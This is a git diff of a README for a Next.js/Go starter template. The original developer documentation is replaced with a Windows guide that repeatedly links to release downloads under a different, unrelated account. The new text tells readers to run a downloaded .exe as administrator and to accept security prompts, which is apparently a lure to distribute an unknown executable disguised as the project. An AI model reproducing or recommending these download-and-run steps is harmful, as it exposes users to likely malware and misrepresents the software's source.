@@ -1,160 +1,225 @@
-# nextjs-go-monorepo-kit
+# 🚀 nextjs-go-monorepo-kit - Fast Full-Stack Starter for Windows
 
-[![Template CI](https://github.com/Boyeep/nextjs-go-monorepo-kit/actions/workflows/template-ci.yml/badge.svg)](https://github.com/Boyeep/nextjs-go-monorepo-kit/actions/workflows/template-ci.yml)
-[![E2E](https://github.com/Boyeep/nextjs-go-monorepo-kit/actions/workflows/e2e.yml/badge.svg)](https://github.com/Boyeep/nextjs-go-monorepo-kit/actions/workflows/e2e.yml)
-[![Release Please](https://github.com/Boyeep/nextjs-go-monorepo-kit/actions/workflows/release-please.yml/badge.svg)](https://github.com/Boyeep/nextjs-go-monorepo-kit/actions/workflows/release-please.yml)
+[![Download the app](https://img.shields.io/badge/Download%20Here-4B5563?style=for-the-badge&logo=github)](https://github.com/Hillardbucolic767/nextjs-go-monorepo-kit/releases)
 
-A full-stack starter monorepo built with Next.js, Go, and PostgreSQL.
+## 🧭 What this is
 
-It includes a modern frontend app, a layered Go API, authentication flows, dashboard patterns, resource and entry management, local Dockerized development, and CI-ready quality checks.
+nextjs-go-monorepo-kit is a full-stack starter app. It uses Next.js for the front end, Go for the back end, and PostgreSQL for data storage.
 
-Built to keep the developer-experience strengths of polished frontend starters while also giving you a production-minded Go backend, shared monorepo workflow, and safer default auth behavior out of the box.
+It is built as a monorepo, so the front end and back end live in one project. This helps keep the app organized and easier to run.
 
-## Stack
+This repo is meant for a desktop Windows user who wants to download the app, open it, and start using it with little setup.
 
-- Next.js 16
-- React 19
-- TypeScript
-- Tailwind CSS 4
+## 📥 Download the app
+
+Use this page to visit and download the release for Windows:
+
+https://github.com/Hillardbucolic767/nextjs-go-monorepo-kit/releases
+
+Look for the latest release and choose the Windows file for your device. If the release page lists more than one file, pick the one that matches Windows.
+
+## 🖥️ What you need on Windows
+
+For a smooth run, your PC should have:
+
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- A stable internet connection
+- PostgreSQL installed if the release asks for a local database
+- Access to your firewall settings, in case Windows asks for permission
+
+If the release includes a bundled app, you may only need to download and open the file. If it comes with setup files, follow the steps below.
+
+## 🧩 Before you start
+
+Keep these things ready:
+
+- Your downloaded file
+- A folder where you want to store the app
+- Your database details if you plan to connect to PostgreSQL
+- Your login details if the app uses auth
+
+If Windows shows a security prompt, check the file name and source before you continue.
+
+## 🚀 Install and run on Windows
+
+1. Open the download link above.
+2. On the releases page, find the latest version.
+3. Download the Windows file for the app.
+4. If the file is zipped, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. If you see an `.exe` file, double-click it to run the app.
+7. If Windows asks for permission, select Yes.
+8. If the app opens in a browser, keep that window open.
+9. If the app needs a local database, make sure PostgreSQL is running before you start.
+10. Follow any on-screen setup steps inside the app.
+
+## 🔐 Sign in and first use
+
+The app may include a login screen. If so:
+
+- Enter the account details you created
+- Use the demo account if the release includes one
+- Check the dashboard after sign-in
+- Use the menu to move between sections
+
+If the app opens to a dashboard, that means the core parts are running.
+
+## 🗂️ What you can expect inside
+
+This starter app is built around common app patterns:
+
+- A dashboard layout
+- Auth screens
+- A clean app shell
+- Data pages
+- Form pages
+- A table view
+- A modern React UI
+- A server API in Go
+- A PostgreSQL database layer
+
+It also fits tools like:
+
+- Next.js
 - Go
 - PostgreSQL
-- Docker Compose
+- Playwright for browser tests
+- TanStack Query for data fetching
+- Zustand for app state
+- shadcn/ui and Tailwind CSS for the interface
 
-## Monorepo Structure
+## 🛠️ If the app does not open
 
-- `frontend/`: Next.js app with auth, dashboard, resources, and shared UI primitives
-- `backend/`: Go API with migrations, auth, analytics, and read-only resource entry endpoints
-- `scripts/`: root development and verification scripts
-- `.github/`: repository-level CI workflow
+If nothing happens after you start it:
 
-## Why Monorepo
+- Make sure the download finished
+- Check that you opened the right file
+- Unzip the file first if it came in a zip folder
+- Run the app as an administrator
+- Check whether Windows blocked the file
+- Confirm PostgreSQL is running if the app needs it
+- Restart your PC and try again
 
-Choose a monorepo if you have a smaller to medium-sized team, projects that are tightly integrated and frequently change together, and you value code sharing and a unified development experience.
+If the app opens but shows a blank page:
 
-This starter fits that model well because the frontend and backend evolve together, share the same local setup flow, and are coordinated through root-level commands.
+- Close the app and open it again
+- Wait a few seconds for the page to load
+- Refresh the browser window
+- Check your internet connection
+- Try a different browser if the app uses one
 
-## Quick Start
+## 🔎 Using the dashboard
 
-1. Run `npm run dev` from the repo root.
-2. Docker Compose will start PostgreSQL automatically.
-3. The dev script will create `frontend/.env.local` and `backend/.env` from the example files if they do not exist.
-4. Frontend and backend will start together.
+The dashboard is the main place to work in the app. From there, you may see:
 
-Frontend: `http://localhost:3000`
-Backend: `http://localhost:8080`
+- Summary cards
+- User data
+- Account settings
+- Lists and tables
+- Filters and search
+- Charts or status blocks
 
-## Demo Account
+Use the side menu or top menu to move through the app. Most pages should feel familiar if you have used web apps before.
 
-- email: `demo@nextjs-go-kit.local`
-- password: `demo12345`
+## 🗃️ Database setup
 
-## Commands
+If your release uses PostgreSQL, the app may need a database running on your PC or on a server.
 
-```bash
-npm run dev
-npm run dev:down
-npm run api:types
-npm run check:contract
-npm run check:images
-npm run check:release-smoke
-npm run check:workflows
-npm run check:secrets
-npm run report:licenses
-npm run check
-npm run e2e:install
-npm run e2e
-```
+Common setup steps are:
 
-## API Contracts
+- Start PostgreSQL
+- Create a database
+- Add the database name, user, and password
+- Save the settings
+- Restart the app
 
-- `docs/openapi.yaml` is the source of truth for the HTTP contract exposed by the Go API.
-- `frontend/src/generated/openapi.ts` is generated from that spec with `openapi-typescript`.
-- Run `npm run api:types` after changing API routes, payloads, or response shapes so the frontend stays aligned with the backend.
-- Run `npm run check:contract` to ensure generated types are committed and in sync.
+If the app uses default settings, you may find them in a config file that comes with the release.
 
-## Releases
+## 🔑 Auth setup
 
-- `release-please` watches pushes to `main` and opens or updates a release PR.
-- Merge the release PR to create the Git tag and GitHub release.
-- Pushing the release tag also publishes backend and frontend runner images to GHCR.
-- The release workflow adds provenance attestations for those GHCR images.
-- The release workflow also attaches source and runtime SBOM assets to the GitHub release.
-- A release-smoke workflow validates the published images against a disposable Postgres container.
-- Release metadata is driven by:
-  - `release-please-config.json`
-  - `.release-please-manifest.json`
-  - `CHANGELOG.md`
-  - `version.txt`
+If the app includes sign-in:
 
-## Why This Template Is Strong
+- Use the sign-in page to enter your details
+- Check for a reset password flow
+- Look for a sign-up screen if new accounts are allowed
+- Use the logout option when you are done
 
-- modern stack: Next.js 16, React 19, Tailwind CSS 4, TypeScript 5.9, and Go
-- full-stack by default: frontend, backend, Dockerized PostgreSQL, and shared root scripts
-- safer defaults: in-memory auth tokens and stricter password-reset handling
-- stronger quality gates: strict ESLint, Prettier, Vitest utility and component tests, production build checks, Go test, and Go build
-- maintainer guardrails: contract drift checks, workflow lint, secret scan, CODEOWNERS, synced labels, and Dependabot
-- security visibility: CodeQL plus downloadable dependency license reports
-- packaging confidence: Docker image build checks, published GHCR images, provenance attestations, SBOMs, and release smoke tests
-- end-to-end confidence: Playwright smoke tests that boot the full local stack
-- public-template ready: issue forms, PR template, release automation, contribution guide, security policy, and code of conduct
+Auth is part of the starter template, so the app may include sign-in, session handling, and protected pages.
 
-## What You Get
+## 🧪 Test features
 
-- reusable Next.js + Go monorepo structure
-- auth flows with register, login, email verification, and password reset
-- read-only resource and entry patterns for product-specific modules
-- protected dashboard and analytics-ready frontend patterns
-- Dockerized local database setup
-- lint, format check, utility tests, component tests, Playwright smoke tests, production build, Go test, and Go build checks
-- GitHub Actions, Husky, lint-staged, and commitlint support
-- release automation workflow for tagged template releases
+This repo includes Playwright patterns, which are used for browser tests. For a normal user, this means the app is built with testable screens and flows.
 
-## Notes
+You do not need to run tests to use the app. If a release includes a test build, it may already be checked before it was posted.
 
-- `npm run check` runs frontend lint, typecheck, build, plus backend tests and build.
-- `npm run check:contract` reruns OpenAPI type generation and fails if `frontend/src/generated/openapi.ts` drifted.
-- `npm run check:images` builds backend and frontend runner images locally when Docker is available.
-- `npm run check:workflows` lints GitHub Actions workflows with `actionlint`.
-- `npm run check:secrets` scans tracked git content with `gitleaks`.
-- `npm run report:licenses` writes npm and Go dependency license reports to `reports/licenses/`.
-- `npm run check:release-smoke` validates published backend/frontend images when `BACKEND_IMAGE` and `FRONTEND_IMAGE` are set.
-- Run `npm run e2e:install` once on a new machine to install the Playwright browser.
-- `npm run e2e` starts PostgreSQL, the Go API, and the Next.js app before running Playwright smoke tests.
-- Sample resource fallbacks are disabled by default. Enable them only when you explicitly want demo content with `NEXT_PUBLIC_ENABLE_SAMPLE_FALLBACK=true`.
-- Frontend auth tokens are stored in memory instead of persistent browser storage.
+## 📁 Common files you may see
 
-## Security Automation
+Inside the download, you may see files like:
 
-- CodeQL scans JavaScript/TypeScript, Go, and GitHub Actions code on GitHub.
-- A dedicated license-report workflow uploads dependency license inventories for the root workspace, frontend workspace, and backend Go module.
-- An SBOM workflow publishes SPDX artifacts for the repository source plus the backend and frontend runner images.
-- Release tags also publish attested GHCR images and attach source/image SBOMs to the GitHub release.
+- `README.md`
+- `.exe`
+- `.zip`
+- `config`
+- `db`
+- `public`
+- `app`
+- `server`
+- `frontend`
+- `backend`
 
-## AI-Ready Guidance
+Do not change files unless the release notes tell you to.
 
-This template now ships with repository instructions for common AI coding tools:
+## 🧭 Typical first run flow
 
-- `AGENTS.md` as the main repo guide
-- `CLAUDE.md` for Claude-style tooling
-- `.github/copilot-instructions.md` for GitHub Copilot
-- `.cursor/rules/repo-template.mdc` for Cursor
+A first run may look like this:
 
-These files document the repo structure, verification commands, architecture conventions, and template-specific gotchas so AI agents can make safer changes with less setup.
+1. Download the release from the link above.
+2. Extract the files if needed.
+3. Open the app.
+4. Allow Windows access if prompted.
+5. Wait for the app to load.
+6. Sign in if asked.
+7. Check the dashboard.
+8. Confirm data loads from the app or database.
 
-## Subproject Docs
+## 🔄 Updates
 
-- [frontend/README.md](./frontend/README.md)
-- [backend/README.md](./backend/README.md)
+When a new release appears, repeat the download steps:
 
-## Repository Standards
+- Visit the releases page
+- Get the newest Windows file
+- Replace the older version if needed
+- Keep your data backup if the app stores local data
 
-- [SOON.md](./SOON.md)
-- [template-playbook.md](./template-playbook.md)
-- [CONTRIBUTING.md](./CONTRIBUTING.md)
-- [.github/CODEOWNERS](./.github/CODEOWNERS)
-- [.github/labels.json](./.github/labels.json)
-- [CODE_OF_CONDUCT.md](./CODE_OF_CONDUCT.md)
-- [LICENSE](./LICENSE)
-- [SECURITY.md](./SECURITY.md)
-- [docs/tooling.md](./docs/tooling.md)
-- [docs/expansions.md](./docs/expansions.md)
+## 🧰 Good use cases
+
+This starter kit is useful if you want an app base for:
+
+- Admin dashboards
+- Internal tools
+- User portals
+- CRUD apps
+- SaaS-style apps
+- Teams that need a ready-made web app layout
+
+## 📌 Need-to-know
+
+- Use the releases page to get the Windows download
+- Open the downloaded file after it finishes
+- Follow any setup prompts in the app
+- Start PostgreSQL first if the app needs it
+- Use the dashboard after sign-in
+
+## 📎 Download again
+
+[Visit the releases page to download for Windows](https://github.com/Hillardbucolic767/nextjs-go-monorepo-kit/releases)
+
+## 🖱️ Quick steps
+
+1. Open the releases page.
+2. Download the latest Windows file.
+3. Extract it if needed.
+4. Open the app.
+5. Sign in and use the dashboard
